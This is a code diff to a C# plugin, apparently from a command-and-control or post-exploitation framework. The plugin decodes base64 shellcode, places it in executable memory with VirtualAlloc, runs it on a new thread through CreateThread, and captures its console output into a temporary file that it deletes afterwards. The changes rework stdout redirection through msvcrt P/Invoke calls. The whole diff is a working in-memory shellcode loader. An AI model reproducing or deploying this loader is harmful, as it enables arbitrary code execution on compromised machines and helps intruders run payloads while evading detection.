@@ -16,29 +16,36 @@ namespace Plugin
             if (args.ContainsKey("File") && (string)args["File"] != "")
             {
                 var x64shellcode = Convert.FromBase64String((string)args["shellcode"]);
-                //var psStr = Encoding.UTF8.GetString(base64EncodedBytes);
-                //psStr = psStr.Replace("Write-Host", "Write-Output");
-
-
-
+  
                 FileStream filestream = new FileStream("out.txt", FileMode.Create);
                 var streamwriter = new StreamWriter(filestream);
                 streamwriter.AutoFlush = true;
-                Console.SetOut(streamwriter);
-                Console.SetError(streamwriter);
+ 
 
-               IntPtr handle = filestream.SafeFileHandle.DangerousGetHandle();
-               int status = SetStdHandle(-11, handle); // set stdout
-                                                    // Check status as needed
-                status = SetStdHandle(-12, handle); // set stderr
-                                                    // Check status as needed
+                //P/Invoke must be used to redirect stdout from the shellcode thread.
+                //see https://stackoverflow.com/questions/54094127/redirecting-stdout-in-win32-does-not-redirect-stdout
 
-                /*StringBuilder builder = new StringBuilder();
+                IntPtr handle = filestream.SafeFileHandle.DangerousGetHandle();
+                int stdout = _dup(1);
+                int fd = _open_osfhandle(handle, 0x00040000);
+                _dup2(fd, 1);
+                _close(fd);
+
+                //may be necessary for some programs... but not until now. 
+                /*
+                StringBuilder builder = new StringBuilder();
                 TextWriter writer = new StringWriter(builder);
                 Console.SetOut(writer);
                 Console.SetError(writer);
+
+                // IntPtr stdout = GetStdHandle(-11);
+                // IntPtr sterr = GetStdHandle(-12);
+                // int status = SetStdHandle(-11, handle); // set stdout
+                // Check status as needed
+                // status = SetStdHandle(-12, handle); // set stderr
+                // Check status as needed
                 */
-                // byte[] x64shellcode = new byte[2] { 0xfc, 0x48 };
+
 
                 IntPtr funcAddr = VirtualAlloc(
                                       IntPtr.Zero,
@@ -53,15 +60,23 @@ namespace Plugin
 
                 hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
 
-                Thread.Sleep(10000);
+                Thread.Sleep(3000);
+ 
                 //WaitForSingleObject(hThread, 0xFFFFFFFF);
                 WaitForSingleObject(hThread, 0);
+
+
+                
+                filestream.Flush();
+                //Thread.Sleep(1000);
                 filestream.Close();
+                _dup2(stdout, 1);
+                   
                 using (StreamReader sr = new StreamReader("out.txt"))
                 {
                     res = sr.ReadToEnd();
                 }
-                //res= builder.ToString();
+                File.Delete("out.txt");
             }
             PluginHandler.AddResponse(new ResponseResult
             {
@@ -94,15 +109,25 @@ namespace Plugin
             uint dwMilliseconds);
 
         [DllImport("Kernel32.dll", SetLastError = true)]
-        public static extern int SetStdHandle(int device, IntPtr handle);
+        private static extern int SetStdHandle(int device, IntPtr handle);
 
-        /*
-         * HANDLE new_stdout = CreateFileA("log.txt", ...);
-SetStdHandle(STD_OUTPUT_HANDLE, new_stdout);
-int fd = _open_osfhandle(new_stdout, O_WRONLY|O_TEXT);
-dup2(fd, STDOUT_FILENO);
-close(fd);
-        */
+        [DllImport("Kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetStdHandle(int device);
+
+        [DllImport("msvcrt.dll")]
+        private static extern int _dup2(int fd1, int fd2);
+
+        [DllImport("msvcrt.dll")]
+        private static extern int _dup(int fd1);
+
+        [DllImport("msvcrt.dll")]
+        private static extern int _open_osfhandle(IntPtr fd1, int fd2);
+
+        [DllImport("msvcrt.dll")]
+        private static extern int _close(int fd2);
+
+        [DllImport("msvcrt.dll")]
+        private static extern IntPtr _get_osfhandle(int fd2);
 
 
         public enum StateEnum
